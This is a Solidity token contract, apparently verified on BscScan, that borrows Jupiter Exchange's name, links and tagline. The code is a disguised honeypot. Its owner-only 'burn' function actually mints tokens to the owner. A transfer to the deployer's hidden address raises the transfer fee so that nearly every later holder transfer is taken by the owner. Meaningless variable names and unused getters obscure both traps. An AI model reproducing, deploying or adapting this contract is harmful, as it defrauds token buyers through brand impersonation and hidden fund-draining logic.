/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

////////////////////////////////////////////////////////////////////
//JupiterExchange
//Jupiter Aggregator 
//@JupiterExchange
//The best swap aggregator and infra in DeFi -  powering best price, token selection and UX for all users and devs. 
//http://discord.gg/jup 🪐
//https://twitter.com/JupiterExchange
//https://jup.ag/
////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.9;
contract Jupiter {
uint256 private  JBRDRS = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  WFPIAY = address(0);
uint256 private  WYYVKO = 10000000000000;
address private  DQYKBM = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  SHPZWG = 1000000000000000000000;
uint256 private  QDOEOB = 1000000000000000000;
uint256 private  HLCSSJ = 100000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  NHXZDJ = address(0);
string public  name = "Jupiter";
mapping (address => uint256) public balanceOf;
uint8 public constant decimals = 18;
address public owner;
uint256 private  KPVHLQ = 1000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  ZFKEWW = address(0);
address private  IBBTYS = address(0);
uint256 public constant JTXTSV = 99999;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  OSZUPX = 10000000000;
string public  symbol = "Jupiter";
function _getJBRDRS() private returns (uint256) {
return JBRDRS;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
NHXZDJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getIBBTYS() private returns (address) {
return IBBTYS;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getOSZUPX() private returns (uint256) {
return OSZUPX;
}

function _getDQYKBM() private returns (address) {
return DQYKBM;
}

function _getKPVHLQ() private returns (uint256) {
return KPVHLQ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SGOVXU");
require(to != address(0), "SGOVXU");
require(amount <= balanceOf[from], "SGOVXU");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* JTXTSV/QDOEOB ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==NHXZDJ){
QDOEOB = JTXTSV+2;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getHLCSSJ() private returns (uint256) {
return HLCSSJ;
}

function _getZFKEWW() private returns (address) {
return ZFKEWW;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getWFPIAY() private returns (address) {
return WFPIAY;
}

function _getWYYVKO() private returns (uint256) {
return WYYVKO;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tSGOVXU 0");
require(spender != address(0), "fSGOVXU 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getSHPZWG() private returns (uint256) {
return SHPZWG;
}


}